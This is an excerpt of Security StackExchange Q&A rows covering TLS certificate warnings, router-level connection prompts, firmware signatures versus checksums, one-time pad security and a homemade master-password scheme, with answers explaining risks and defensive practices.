<p><a href=""https://security.stackexchange.com/questions/248419/ubuntu-sources-list-urls-are-not-https-what-risk-does-this-present-if-any"">ubuntu sources.list urls are not HTTPS -- what risk does this present, if any?</a></p>
","29"
"261890","261890","Is it safe to ignore/override TLS warnings if user doesn't enter passwords or other data?","<p>A user is trying to access a poorly maintained website using a modern OS (Windows 10) and web browser (Firefox 100.0). They want to download something from there, but they are seeing a security warning indicating that the host is using a deprecated TLS protocol version and/or has an issue with its certificate. The user been in touch with the person who owns the domain and downloadable content, and this person is being slow to get it fixed.</p>
<p><strong>Questions:</strong></p>
<ol>
<li>Can the user (re-)enable old TLS protocol versions for this site in Firefox (<code>security.tls.version.enable-deprecated = FALSE</code>), and safely browse &amp; download content as long as they avoid entering data such as credit card numbers, passwords, etc.?</li>
<li>Or does simply browsing a site using old TLS versions itself carry inherent risks?</li>
<li>If the latter, is there a way for them to reasonably mitigate these risks? (By reasonable, I mean without configuring network/firewall settings, using a container, etc.)</li>
</ol>
<p>They are considering firing up an old Windows XP computer running an also-old Internet Explorer, which I'm open to letting them do, as long as they don't share their data on the network and take the device offline as soon as they are done. LMK if you can think of any reasons why this would be a bad idea.</p>
<p>I looked for answers on Firefox forums, this forum, and via a general web search, but I didn't find anything useful.</p>
","27","5","261905","<p>It depends on the stakes involved.</p>
<p>The broken TLS will not, by itself, damage the browser, the downloading computer and the file.</p>
<p>If the file is &quot;look how funny my dog jumps&quot; video and the computer where the user downloads and uses it is not of a national security importance and uses a wired connection to a reputable ISP, then - maybe ok.</p>
<p>What could go wrong, then?</p>
<ul>
<li><p>One could forget to return the browser settings to their secure defaults. This can backfire the next time when a TLS downgrade-type attack is performed on some other site.</p>
</li>
<li><p>A poorly maintained website is probably poorly maintained in many aspects. It may as well be already controlled by malicious parties, because the owner lagged not only with TLS certificate renewal, but with the security updates as well. The site may be already serving malware.</p>
</li>
</ul>
<p>An updated browser running on an updated OS should be immune to most circulating exploits, but a matter of life is that new security vulnerabilities are discovered all the time.</p>
<p>Then again, the file will be opened with some other software, generally different from your browser. Is this software (e.g. a spreadsheet program or a video player) up to date as well?</p>
<hr />
<p>p.s. If the certificate is ONLY expired (&quot;not valid after&quot; some past date) and not of some deprecated, vulnerable type - chances are that everything else is OK.</p>
","8"
"261890","261890","Is it safe to ignore/override TLS warnings if user doesn't enter passwords or other data?","<p>A user is trying to access a poorly maintained website using a modern OS (Windows 10) and web browser (Firefox 100.0). They want to download something from there, but they are seeing a security warning indicating that the host is using a deprecated TLS protocol version and/or has an issue with its certificate. The user been in touch with the person who owns the domain and downloadable content, and this person is being slow to get it fixed.</p>
<p><strong>Questions:</strong></p>
<ol>
<li>Can the user (re-)enable old TLS protocol versions for this site in Firefox (<code>security.tls.version.enable-deprecated = FALSE</code>), and safely browse &amp; download content as long as they avoid entering data such as credit card numbers, passwords, etc.?</li>
<li>Or does simply browsing a site using old TLS versions itself carry inherent risks?</li>
<li>If the latter, is there a way for them to reasonably mitigate these risks? (By reasonable, I mean without configuring network/firewall settings, using a container, etc.)</li>
</ol>
<p>They are considering firing up an old Windows XP computer running an also-old Internet Explorer, which I'm open to letting them do, as long as they don't share their data on the network and take the device offline as soon as they are done. LMK if you can think of any reasons why this would be a bad idea.</p>
<p>I looked for answers on Firefox forums, this forum, and via a general web search, but I didn't find anything useful.</p>
","27","5","261920","<p>There are, to my knowledge, 2 risks of connecting to a site without TLS, both of which have been mentioned in some ways, but I wanted to give my own spin on them:</p>
<ol>
<li>Safety.</li>
</ol>
<p>The potential for man-in-the-middle attacks mean that any executable code downloaded from the site is suspect. <strong>Do not</strong> trust any binaries unless and until you can verify their safety independently.</p>
<p>There are two ways that I know of: by hashing the file and comparing it to a hash delivered over TLS or some other, secure channel, and by uploading it to a site like <a href=""https://www.virustotal.com/gui/home/upload"" rel=""noreferrer"">VirusTotal</a> that scans it with a bunch of malware scanners. Neither approach is flawless; malware can still hide in there, but they greatly mitigate the risk. If you're in a high-stakes situation or have any additional reason to suspect the file, confining it to a sandbox (e.g., a virtual machine) is a good idea.</p>
<p>If you're just downloading file that you will treat as plain text, it's not really a risk, but do beware of <a href=""https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-057"" rel=""noreferrer"">media files that could exploit vulnerabilities in a player program</a>. As fraxinus helpfully mentioned, the site itself can try to exploit browser vulnerabilities (JavaScript or otherwise). Of course, the file can also simply contain bogus data; if it's a financial report, don't trust the numbers.</p>
<p><strong>All of these things can also occur even with TLS enabled</strong> if a site is compromised by a malicious actor, so TLS is not a guarantee of safety, anyway. This is why we put digital signatures on binaries... although build servers and dependency chains can be compromised as well. No security is perfect, but we reduce risks where we can.</p>
<ol start=""2"">
<li>Privacy.</li>
</ol>
<p>TLS encrypts the traffic. Without that, as you've correctly identified, any passwords you send aren't secret. In addition to that, Internet Service Providers at the very least <strong>can trivially identify what is being transferred to you</strong>, including your ISP, the host's, and any others involved in the connection between you and the host. Other actors on your local network and on the host's network may even be able to see the traffic, depending on the network setup. If there is any reason you don't want the whole world knowing what specific page you are visiting and what specific files you are downloading, you <strong>must not</strong> connect without TLS. Even with encryption, law enforcement agencies can generally get logs from a host, but ISPs, criminals, and private investigators cannot so easily get ahold of them.</p>
","5"
"261786","261786","Why don’t routers request permission when attempting to connect to an unknown address? (Or why do they still assume every connection is trustworthy?)","<p>I’m imagining a system similar to UAC on Windows but implemented at the router level for IP addresses instead. (Or AS numbers, BGP numbers, Port number, etc…)</p>
<p>Naturally this makes router setup slightly more complicated because at least one admin user, or device, will have to be specified and makes usage more of a hassle due to interruptions by the router UAC agent. A sensible whitelist will likely have to come as the default in order for setup to to be easy to use out of the box.</p>
<p>Even so, it seems like a attractive feature for Enterprise customers, security conscious consumers, and even as an optional feature on higher performance routers that already have the necessary performance to implement it. Especially since it needs to be only configured once instead of per device.</p>
<p>Yet, I can’t seem to find any that I can buy right now that offer this kind of security. Which seems odd since it definitely could be a differentiator or a premium feature to charge more for.</p>
<p>Is there something preventing router manufacturer’s from offering this?</p>
","-1","3","261788","<blockquote>
<p>Why don’t routers request permission when attempting to connect to an unknown address?</p>
</blockquote>
<p>Routers don't &quot;connect&quot; to addresses. They just forward packets: it is the client who is initiating the connection and the router will just facilitate that the packets reach the destination given by the client.</p>
<blockquote>
<p>Or why they still assume every connection is trustworthy</p>
</blockquote>
<p>They don't. In fact, they make no assumptions at all about trust but leave such decisions up to the client which usually has more context to make such decisions.</p>
<p>While there might be some IP addresses that are only used for malicious purposes, most IP addresses are not. For example content delivery networks have zillions of domains on the same IP addresses, some of these might be used for malicious purposes, most not. Thus the more relevant context here would be the domain name, and there are <a href=""https://en.wikipedia.org/wiki/Deep_packet_inspection"" rel=""nofollow noreferrer"">DPI</a> or DNS based approaches which provide filtering on the domain name.</p>
<p>But stupidly asking the user with each new IP address or domain name, if they should proceed, would not scale. First, there are many IP address and domains involved when doing normal browsing - so there would be lots of questions. Then, most users don't have a clue if the target is malicious or not just based on the IP address or domain name. On what information should they decide? They have no useful context.</p>
","1"
"261786","261786","Why don’t routers request permission when attempting to connect to an unknown address? (Or why do they still assume every connection is trustworthy?)","<p>I’m imagining a system similar to UAC on Windows but implemented at the router level for IP addresses instead. (Or AS numbers, BGP numbers, Port number, etc…)</p>
<p>Naturally this makes router setup slightly more complicated because at least one admin user, or device, will have to be specified and makes usage more of a hassle due to interruptions by the router UAC agent. A sensible whitelist will likely have to come as the default in order for setup to to be easy to use out of the box.</p>
<p>Even so, it seems like a attractive feature for Enterprise customers, security conscious consumers, and even as an optional feature on higher performance routers that already have the necessary performance to implement it. Especially since it needs to be only configured once instead of per device.</p>
<p>Yet, I can’t seem to find any that I can buy right now that offer this kind of security. Which seems odd since it definitely could be a differentiator or a premium feature to charge more for.</p>
<p>Is there something preventing router manufacturer’s from offering this?</p>
","-1","3","267367","<p>That is because routers are not made for this. Routers are made for routing packets. That is their main function. As said by @Steffen Ullrich, they do not connect to the other site, the PC at your side does that.</p>
<p>It is possible to do some blacklisting of IP addresses on routers. Cisco, for example, has ACLs that allow you to block certain IP addresses in the flow. For example: if the destination of the packet is 11.22.33.44, drop the packet. The capability of these ACLs is limited though; there is a maximum of ACLs depending on the type of router.</p>
<p>If you want to blacklist certain sites, you will need an up-to-date list that is applied to your router, probably on a daily basis.  You will need to find a blacklist-provider that provides blacklists that are short enough for your router. And some tooling to do that automatically.</p>
<p>It is not an attractive option for enterprise customers. Enterprises have firewalls and proxies  which are more appropriate for filtering access to the Internet.</p>
","1"
"261786","261786","Why don’t routers request permission when attempting to connect to an unknown address? (Or why do they still assume every connection is trustworthy?)","<p>I’m imagining a system similar to UAC on Windows but implemented at the router level for IP addresses instead. (Or AS numbers, BGP numbers, Port number, etc…)</p>
<p>Naturally this makes router setup slightly more complicated because at least one admin user, or device, will have to be specified and makes usage more of a hassle due to interruptions by the router UAC agent. A sensible whitelist will likely have to come as the default in order for setup to to be easy to use out of the box.</p>
<p>Even so, it seems like a attractive feature for Enterprise customers, security conscious consumers, and even as an optional feature on higher performance routers that already have the necessary performance to implement it. Especially since it needs to be only configured once instead of per device.</p>
<p>Yet, I can’t seem to find any that I can buy right now that offer this kind of security. Which seems odd since it definitely could be a differentiator or a premium feature to charge more for.</p>
<p>Is there something preventing router manufacturer’s from offering this?</p>
","-1","3","267368","<blockquote>
<p>I’m imagining a system similar to UAC on Windows but implemented at the router level for IP addresses instead. (Or AS numbers, BGP numbers, Port number, etc…)</p>
</blockquote>
<p>It wouldn't make us safer, and it would condition users to answer yes to everything, because otherwise stuff doesn't work. Furthermore, sites move around a lot, thanks to CDN's. Heck, they are likely to share networks with untrustworthy sites - due to CDN's.</p>
<p>Do you know if <code>151.101.0.0/16</code> is trustworthy? It's a range belonging to a CDN (Fastly).</p>
<p>Such a setup makes sense in some narrow cases, such as IOT networks, where you want your clients to communicate with a very narrow and well defined set of hosts, so it's simple to whitelist the required traffic. For general purpose web browsing, it doesn't make sense due to the workload of keeping it  up to date, and the minimal protection offered.</p>
","1"
"261761","261761","Is signing a file better than issuing a checksum, and does it render a separate checksum useless?","<p>Alternatively, the question could be asked: Does issuing a checksum for a file we sign anyways just duplicate work?</p>
<p>Use case: Firmware sent to an IoT device. We sign it, and form a separate checksum for it.</p>
<p>My understanding is that this is unnecessary, since the signing process guarantees data integrity and data authenticity whereas a separate checksum only guarantees data integrity. Is this correct? Can I just not send and store this additional checksum?</p>
<p>Related questions that don't answer this:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/261597/how-do-iot-devices-know-the-checksum-of-firmware-upgrades"">How do IoT devices know the checksum of firmware upgrades?</a></li>
<li><a href=""https://security.stackexchange.com/questions/231204/directly-signing-a-file-with-gpg-or-instead-its-checksum-file"">Directly signing a file with gpg or instead its checksum file?</a></li>
</ul>
<p>Additional research that I think supports the answer being yes:</p>
<ul>
<li><a href=""https://csrc.nist.gov/CSRC/media/Publications/white-paper/2018/01/26/security-considerations-for-code-signing/final/documents/security-considerations-for-code-signing.pdf"" rel=""noreferrer"">Abstract from csrc.nist.gov</a></li>
<li><a href=""https://crypto.stackexchange.com/questions/58017/why-do-digital-signatures-use-a-hash-algorithm-instead-of-a-checksum"">Question from crypto.stackexchange.com</a></li>
<li><a href=""https://pthree.org/2016/02/16/checksums-digital-signatures-and-message-authentication-codes-oh-my/#:%7E:text=Digital%20signatures%20are%20a%20form,an%20identity%20to%20the%20checksum."" rel=""noreferrer"">Article from pthree.org</a></li>
</ul>
","19","4","261764","<p>I would say that you are completely correct, but also not correct at the same time.</p>
<p>From the IoT device's point of view, I agree that checking the signature does everything the checksum does, and more. There is no reason to send the checksum <em>and</em> the signature to the device; just send the signature.</p>
<hr />
<p>However, from a human perspective, checksums are much easier to work with than signatures. For example:</p>
<ul>
<li>Someone downloads the file and wants to check integrity on the downloaded file.</li>
<li>The file gets moved around within your network, and you want to check it again before pushing it to the device.</li>
</ul>
<p>You could do these checks with signatures, but there are a number of user-friendliness obstacles:</p>
<ul>
<li>You need a signature verifier that knows about the specific format of these signatures, for example Windows binaries, java signed jars, linux packages, etc, all have different signature formats and require different tools to verify.</li>
<li>You need to finnagle with importing the right root CA cert or GPG key into the signature verifier.</li>
</ul>
<p>By comparison, checksums are much easier, you just hash the file and check that it matches the value on the vendor's website.</p>
<p>In addition, checksums confirm that you have the right <em>version</em> of the file, which signatures do not give you.</p>
<hr />
<p>Finally, I dispute this:</p>
<blockquote>
<p>a separate checksum only guarantees data-integrity.</p>
</blockquote>
<p>If you are comparing your locally-computed checksum against, for example, the checksum value on the vendor's website, then the checksum is in fact authenticated by the HTTPS certificate on the website.</p>
","20"
"261761","261761","Is signing a file better than issuing a checksum, and does it render a separate checksum useless?","<p>Alternatively, the question could be asked: Does issuing a checksum for a file we sign anyways just duplicate work?</p>
<p>Use case: Firmware sent to an IoT device. We sign it, and form a separate checksum for it.</p>
<p>My understanding is that this is unnecessary, since the signing process guarantees data integrity and data authenticity whereas a separate checksum only guarantees data integrity. Is this correct? Can I just not send and store this additional checksum?</p>
<p>Related questions that don't answer this:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/261597/how-do-iot-devices-know-the-checksum-of-firmware-upgrades"">How do IoT devices know the checksum of firmware upgrades?</a></li>
<li><a href=""https://security.stackexchange.com/questions/231204/directly-signing-a-file-with-gpg-or-instead-its-checksum-file"">Directly signing a file with gpg or instead its checksum file?</a></li>
</ul>
<p>Additional research that I think supports the answer being yes:</p>
<ul>
<li><a href=""https://csrc.nist.gov/CSRC/media/Publications/white-paper/2018/01/26/security-considerations-for-code-signing/final/documents/security-considerations-for-code-signing.pdf"" rel=""noreferrer"">Abstract from csrc.nist.gov</a></li>
<li><a href=""https://crypto.stackexchange.com/questions/58017/why-do-digital-signatures-use-a-hash-algorithm-instead-of-a-checksum"">Question from crypto.stackexchange.com</a></li>
<li><a href=""https://pthree.org/2016/02/16/checksums-digital-signatures-and-message-authentication-codes-oh-my/#:%7E:text=Digital%20signatures%20are%20a%20form,an%20identity%20to%20the%20checksum."" rel=""noreferrer"">Article from pthree.org</a></li>
</ul>
","19","4","261768","<p><strong>It's not uncommon to have both.</strong></p>
<p>For example, developers of the Tails operating system sign their ISO's using GPG.  See <a href=""https://tails.boum.org/install/expert/index.en.html#verify"" rel=""noreferrer"">https://tails.boum.org/install/expert/index.en.html#verify</a> for more info.</p>
<p>But, because the process of verifying a GPG signature is unfamiliar to many users, Tails also provides a web based tool to enable users to verify the the integrity of Tails ISO's using a checksum hash that is accessed from the Tails web site via HTTPS.  See <a href=""https://tails.boum.org/contribute/design/download_verification/"" rel=""noreferrer"">https://tails.boum.org/contribute/design/download_verification/</a> for more info.  (FD, I am the developer of this tool).</p>
<p>Bear in mind that a digital signature, where the private signing key is stored offline, is generally more secure than a checksum hash posted on the developer's web site.  If the site is hacked, the hacker can replace the ISO with a malicious file, then simply update the checksum hash posted on the site to match that of the malicious ISO.  On the contrary, if the private signing key is stored offline, the attacker has no way to sign the malicious ISO using the developer's private key.</p>
<p>Related:  <a href=""https://security.stackexchange.com/questions/237474/whats-the-point-of-providing-file-checksums-for-verifying-downloads"">What&#39;s the point of providing file checksums for verifying downloads?</a></p>
","9"
"261761","261761","Is signing a file better than issuing a checksum, and does it render a separate checksum useless?","<p>Alternatively, the question could be asked: Does issuing a checksum for a file we sign anyways just duplicate work?</p>
<p>Use case: Firmware sent to an IoT device. We sign it, and form a separate checksum for it.</p>
<p>My understanding is that this is unnecessary, since the signing process guarantees data integrity and data authenticity whereas a separate checksum only guarantees data integrity. Is this correct? Can I just not send and store this additional checksum?</p>
<p>Related questions that don't answer this:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/261597/how-do-iot-devices-know-the-checksum-of-firmware-upgrades"">How do IoT devices know the checksum of firmware upgrades?</a></li>
<li><a href=""https://security.stackexchange.com/questions/231204/directly-signing-a-file-with-gpg-or-instead-its-checksum-file"">Directly signing a file with gpg or instead its checksum file?</a></li>
</ul>
<p>Additional research that I think supports the answer being yes:</p>
<ul>
<li><a href=""https://csrc.nist.gov/CSRC/media/Publications/white-paper/2018/01/26/security-considerations-for-code-signing/final/documents/security-considerations-for-code-signing.pdf"" rel=""noreferrer"">Abstract from csrc.nist.gov</a></li>
<li><a href=""https://crypto.stackexchange.com/questions/58017/why-do-digital-signatures-use-a-hash-algorithm-instead-of-a-checksum"">Question from crypto.stackexchange.com</a></li>
<li><a href=""https://pthree.org/2016/02/16/checksums-digital-signatures-and-message-authentication-codes-oh-my/#:%7E:text=Digital%20signatures%20are%20a%20form,an%20identity%20to%20the%20checksum."" rel=""noreferrer"">Article from pthree.org</a></li>
</ul>
","19","4","261777","<p>Checksums are typically easier to compute.  If you're validating the signature on a given device anyways, that wont matter.  But sometimes you may want to validate on one device and check for errors on a weaker one.  Checksums are also simpler.  If I am using a message to flash my IoT device's firmware, I may want the firmware itself to check the checksum before bricking itself because the software made an endinness error while passing the data into my firmware buffers.</p>
<p>Also, some checksums are more powerful than merely checking for errors.  It all depends on the particular checksum, but some of them also permit <em>correction</em> of errors.  As an example, <a href=""https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction"" rel=""nofollow noreferrer"">Reed-Solomon</a> codes can correct many small errors, something that can be difficult with signatures.  <a href=""https://en.wikipedia.org/wiki/Turbo_code"" rel=""nofollow noreferrer"">Turbo Codes</a> and <a href=""https://en.wikipedia.org/wiki/Low-density_parity-check_code"" rel=""nofollow noreferrer"">Low Density Pairty Check Codes</a> get used in environments where lots of errors can be expected and re-sending is expensive.</p>
","3"
"261761","261761","Is signing a file better than issuing a checksum, and does it render a separate checksum useless?","<p>Alternatively, the question could be asked: Does issuing a checksum for a file we sign anyways just duplicate work?</p>
<p>Use case: Firmware sent to an IoT device. We sign it, and form a separate checksum for it.</p>
<p>My understanding is that this is unnecessary, since the signing process guarantees data integrity and data authenticity whereas a separate checksum only guarantees data integrity. Is this correct? Can I just not send and store this additional checksum?</p>
<p>Related questions that don't answer this:</p>
<ul>
<li><a href=""https://security.stackexchange.com/questions/261597/how-do-iot-devices-know-the-checksum-of-firmware-upgrades"">How do IoT devices know the checksum of firmware upgrades?</a></li>
<li><a href=""https://security.stackexchange.com/questions/231204/directly-signing-a-file-with-gpg-or-instead-its-checksum-file"">Directly signing a file with gpg or instead its checksum file?</a></li>
</ul>
<p>Additional research that I think supports the answer being yes:</p>
<ul>
<li><a href=""https://csrc.nist.gov/CSRC/media/Publications/white-paper/2018/01/26/security-considerations-for-code-signing/final/documents/security-considerations-for-code-signing.pdf"" rel=""noreferrer"">Abstract from csrc.nist.gov</a></li>
<li><a href=""https://crypto.stackexchange.com/questions/58017/why-do-digital-signatures-use-a-hash-algorithm-instead-of-a-checksum"">Question from crypto.stackexchange.com</a></li>
<li><a href=""https://pthree.org/2016/02/16/checksums-digital-signatures-and-message-authentication-codes-oh-my/#:%7E:text=Digital%20signatures%20are%20a%20form,an%20identity%20to%20the%20checksum."" rel=""noreferrer"">Article from pthree.org</a></li>
</ul>
","19","4","261807","<p>Checksums and signatures have different purposes.</p>
<p>Checksums are good for verifying data <em>integrity</em>. They verify that you have received what you expected to receive. I would not recommend CRC32 or MD5 for verifying file integrity - use SHA256 (<code>sha256sum</code> on Linux, <code>shasum -a 256</code> on OSX) instead. CRC32 and MD5 both have a large enough number of collisions, and CRC32 is particularly vulnerable to brute force (we were cracking CRC32 back in 2000s to make cheats for GunZ!) that it's not reliable to verify file integrity, IMO.</p>
<p>Signatures are useful for verifying data integrity <em>and</em> that the file originated from a given source. They are useful when you need to ensure that not only was the data not modified, but it also came from a specific individual or group of individuals. Example uses would be the distribution of software from an app store - Signing the app before you send it to your app store ensures Acme App Store hasn't modified the app contents, and Acme App Store can be sure that the binary came from <em>you</em>, not just someone who guessed your API keys for uploading.</p>
<p>The caveat with signatures is that they require some shared key material, and often those keys can expire. Verifying the signature of a file is also more tricky. Checksums only require a simple file be hosted somewhere, and verifying the checksum can be done visually or by comparing two files.</p>
<p>If your firmware is being flashed onto an IoT device before shipping it out, I think a checksum is probably fine - although, if it's flashed on an IoT device (and you control that flashing process), you probably don't even need data integrity.</p>
<p>If the device is reaching out to your website directly, and youre hosting the patches, a checksum is probably fine. However, if you're using an intermediary, you probably want a signature.</p>
<p>You are correctly though that, if a machine is doing all the work, you <em>probably</em> don't need to have both a checksum and a signature, as the signature will perform the checksum for you. However, as other commenters have mentioned, it can be useful to have a checksum if humans will be involved, as verifying a sha256sum is typically a lot easier than verifying a binary is signed correctly for a human.</p>
","2"
"261753","261753","Why is one-time pad informationally secure?","<p>I am reading &quot;Serious cryptography&quot; and he wrote the following:</p>
<blockquote>
<p>Informational security is based not on how hard it is to break a cipher,
but whether it’s conceivable to break it at all. A cipher is informationally
secure only if, even given unlimited computation time and memory, it
cannot be broken. Even if a successful attack on a cipher would take
trillions of years, such a cipher is informationally insecure.</p>
</blockquote>
<p>Then, he proceeded to write that the one-time pad is informationally secure.</p>
<p>I don't understand this at all. If we see a cyphertext, such as <code>00110</code>, we know that the corresponding plaintext has 5 bits as well, and the cypher key will also have 5 bits, thus <code>2^5*2^5=1024</code> possible combinations. Bruteforcing <code>1024</code> will yield a result. Even if the cyphertext is huge and bruteforcing won't be practical, it is still <strong>theoretical</strong> possible, no?</p>
<p>If it is theoretical possible, wouldn't it deem the one-time pad as informationally insecure?</p>
<p>What am I missing here?</p>
","30","3","261754","<blockquote>
<p>Bruteforcing all 1024 possibilities will yield a result.</p>
</blockquote>
<p>Yes, <em>a</em> result. But even if you iterate all 32 5-bit combinations, you still have no idea which one the &quot;correct&quot; one is. That's what makes it informationally secure: Even if you iterate every key (and thus, every possible message), you don't know which of these messages is the one that was sent.</p>
<p>For example, imagine the following message:</p>
<blockquote>
<p>ATTACK AT 8</p>
</blockquote>
<p>It's 11 characters long, and you could conceivably iterate the space of all 11-character strings. This will yield results such as:</p>
<blockquote>
<p>PIZZA TIME!<br />
YOZNACKS :)<br />
ATTACK AT 3<br />
ATTACK AT 8<br />
IN UR BASE!</p>
</blockquote>
<p>Now you look at all these messages and you still are none the wiser. In fact, you don't even need the ciphertext at all. Knowing the length of the message, you can simply iterate the entire message-space and all you will know for sure is that one of these messages must be the correct one.</p>
<hr />
<p>To break it down even further, imagine your message is just a single bit, either <code>1</code> or <code>0</code>. To encrypt it, you either decide to &quot;flip&quot; it or not (meaning, you XOR it with <code>1</code> or <code>0</code>).</p>
<p>This leaves us with the following 4 states:</p>
<ol>
<li>Message <code>0</code>, Key <code>0</code> =&gt; Ciphertext <code>0</code></li>
<li>Message <code>0</code>, Key <code>1</code> =&gt; Ciphertext <code>1</code></li>
<li>Message <code>1</code>, Key <code>0</code> =&gt; Ciphertext <code>1</code></li>
<li>Message <code>1</code>, Key <code>1</code> =&gt; Ciphertext <code>0</code></li>
</ol>
<p>You then present the ciphertext to the attacker, while keeping the key secret. Say, you present <code>1</code>. According to the table, the message was either <code>0</code> with a key of <code>1</code>, or the message was <code>1</code> with a key of <code>0</code>. But since the attacker does not know the key, they only have a 50% chance of guessing the correct bit - which is the best they can do in a perfect system.</p>
<p>For every bit in the message, the chance of successfully guessing the message is divided by half. And again, you can only guess the message - there is no indication whether your guess is correct or not.</p>
","95"
"261753","261753","Why is one-time pad informationally secure?","<p>I am reading &quot;Serious cryptography&quot; and he wrote the following:</p>
<blockquote>
<p>Informational security is based not on how hard it is to break a cipher,
but whether it’s conceivable to break it at all. A cipher is informationally
secure only if, even given unlimited computation time and memory, it
cannot be broken. Even if a successful attack on a cipher would take
trillions of years, such a cipher is informationally insecure.</p>
</blockquote>
<p>Then, he proceeded to write that the one-time pad is informationally secure.</p>
<p>I don't understand this at all. If we see a cyphertext, such as <code>00110</code>, we know that the corresponding plaintext has 5 bits as well, and the cypher key will also have 5 bits, thus <code>2^5*2^5=1024</code> possible combinations. Bruteforcing <code>1024</code> will yield a result. Even if the cyphertext is huge and bruteforcing won't be practical, it is still <strong>theoretical</strong> possible, no?</p>
<p>If it is theoretical possible, wouldn't it deem the one-time pad as informationally insecure?</p>
<p>What am I missing here?</p>
","30","3","261779","<p>MechMK1 answer is a very good explanation and I just want to make some additions:</p>
<p>Yes, if the cipher text is 5 Bits your adversary has learned that the message was 5 bits. Especially, he has learned, that there was communication at all, which maybe something you might want to avoid. That is why in such cases one performs dummy communication to keep the line busy.</p>
<p>The term &quot;informationally secure&quot; refers to the content of your message and what the adversary might theoretically learn about the plain text by observing the cipher text. To quantify this, one can use the concept of <a href=""https://en.wikipedia.org/wiki/Mutual_information"" rel=""nofollow noreferrer"">mutual information</a>. Mutual information can be thought of as follows (I find the definition I(X;Y)=H(X)-H(X|Y) being the most convenient for this purpose) : You have some uncertainty, what the message is (usually measured by its entropy). Now you observe the cipher text. Afterwards your uncertainty about the message is reduced to the conditional entropy given you know the cipher text. The difference between those twos, namely the mutual information, quantifies how much learned. For one time pads, this difference is 0, which means you haven't learned anything. Note that we have no requirement that the plain text message are somehow equidistributed, only the key.</p>
<p>Regarding you brute force method:
You could do that, but you still haven't learned anything. All possible decryptions are equally likely.</p>
","10"
"261753","261753","Why is one-time pad informationally secure?","<p>I am reading &quot;Serious cryptography&quot; and he wrote the following:</p>
<blockquote>
<p>Informational security is based not on how hard it is to break a cipher,
but whether it’s conceivable to break it at all. A cipher is informationally
secure only if, even given unlimited computation time and memory, it
cannot be broken. Even if a successful attack on a cipher would take
trillions of years, such a cipher is informationally insecure.</p>
</blockquote>
<p>Then, he proceeded to write that the one-time pad is informationally secure.</p>
<p>I don't understand this at all. If we see a cyphertext, such as <code>00110</code>, we know that the corresponding plaintext has 5 bits as well, and the cypher key will also have 5 bits, thus <code>2^5*2^5=1024</code> possible combinations. Bruteforcing <code>1024</code> will yield a result. Even if the cyphertext is huge and bruteforcing won't be practical, it is still <strong>theoretical</strong> possible, no?</p>
<p>If it is theoretical possible, wouldn't it deem the one-time pad as informationally insecure?</p>
<p>What am I missing here?</p>
","30","3","261828","<p>Instead of thinking of decrypting a single message, think of that idea of &quot;breaking&quot; the code. Suppose we have an algorithmic cypher, a hundred messages encrypted using it, and a mega-powerful science fiction computer (simulating &quot;unlimited computation time and memory&quot;). It blasts through gagillions of cyphers and finds one with reasonable results for all 100 messages. We think we've &quot;broken&quot; the cypher, in the sense that we can quickly decode the 101st message using our guessed algorithm. We could give our solution to anyone to let them easily decode future messages.</p>
<p>Now try that on a 1-time pad and you'll see it won't work. Let's go nuts and say a spy has given us everything -- the real contents of the first 100 messages together with confirmation of the first 100 entries in the pad. How can we use that to decode the 101st message? Well, not at all. The 101st entry in the pad is independently random. It's like looking at a sequence of 100 numbers, being asked to guess the next, and being told &quot;BTW, these are all random&quot;. This is what the author means by writing it's not conceivable to break a 1-time pad in the sense of breaking an algorithmic one.</p>
","1"
"261747","261747","Is this a secure approach to store a master password?","<p>I have come up with the following approach to remember master passwords (to use in software like KeePass, etc): Since it is annoying to type the master password every time we power up the PC, we store a text file that contains an unanswered, personal question. The master password is obtained by answering the question, saving the text file and calculating the SHA256 check sum. Then we edit the file again to delete the answer, and save the file again.</p>
<p>My question is, are there some obvious flaws on this approach (rather than social ones: say we are 100% certain that we are the only ones that know the answer)?</p>
","2","3","261755","<p>In your scheme, the SHA-256 hash is just sugar, anyone with knowledge of your system (and you should assume an attacker has this <a href=""https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""noreferrer"">knowledge</a>) can recreate it, hence its security is limited by how difficult it is for an attacker to guess the answer.</p>
<p>And if that answer is a honest one, you can easily be worse off than using it as the master password directly, because the question gives the attacker a hint, and might make it <a href=""https://en.wikipedia.org/wiki/Sarah_Palin_email_hack"" rel=""noreferrer"">very easy to hack.</a></p>
","18"
"261747","261747","Is this a secure approach to store a master password?","<p>I have come up with the following approach to remember master passwords (to use in software like KeePass, etc): Since it is annoying to type the master password every time we power up the PC, we store a text file that contains an unanswered, personal question. The master password is obtained by answering the question, saving the text file and calculating the SHA256 check sum. Then we edit the file again to delete the answer, and save the file again.</p>
<p>My question is, are there some obvious flaws on this approach (rather than social ones: say we are 100% certain that we are the only ones that know the answer)?</p>
","2","3","261758","<p>You are probably looking for using a keyfile, e.g., stored on a USB stick.</p>
<p>Other options are devices like the Yubikey, that can store a password (some can protect it using a fingerprint reader) or PGP-Keycards that decrypt your passphrase on the device itself in a way that the master key never leaves the device.</p>
","6"
"261747","261747","Is this a secure approach to store a master password?","<p>I have come up with the following approach to remember master passwords (to use in software like KeePass, etc): Since it is annoying to type the master password every time we power up the PC, we store a text file that contains an unanswered, personal question. The master password is obtained by answering the question, saving the text file and calculating the SHA256 check sum. Then we edit the file again to delete the answer, and save the file again.</p>
<p>My question is, are there some obvious flaws on this approach (rather than social ones: say we are 100% certain that we are the only ones that know the answer)?</p>
","2","3","261787","<p>Unfortunately the answer is yes, keeping in the spirit of your methodology (which from a &quot;pure&quot; security standpoint is terrible, but a good starting point that's better than a sticky note under the keyboard; it's good that you're asking the question!). This method is fine to keep random people out of your password list, but a determined attacker will go through this easily. (See brute-force attacks for an idea how)</p>
<p>Since you're saving the file with the password (possibly the correct password) and then re-writing the file, there is a good chance that the file is not actually being overwritten on disk (and a simple spelling error could leave a copy around too). This means that a search of the file system by an attacker could find the bytes that were stored by your file.</p>
<p>If you didn't write the file with the password and just calculated your checksum with the password in memory, it makes this process slightly more secure (nothing on disk ever has any password attempt), but as mentioned by other answers, it's still based on the question being answered being a closely guarded secret.</p>
<p>As mentioned by others, some sort of USB keyfob for each person would potentially be a better option. This would also allow you to just remove someone's lost keyfob from the allowed set of fobs if they misplaced it.</p>
","1"
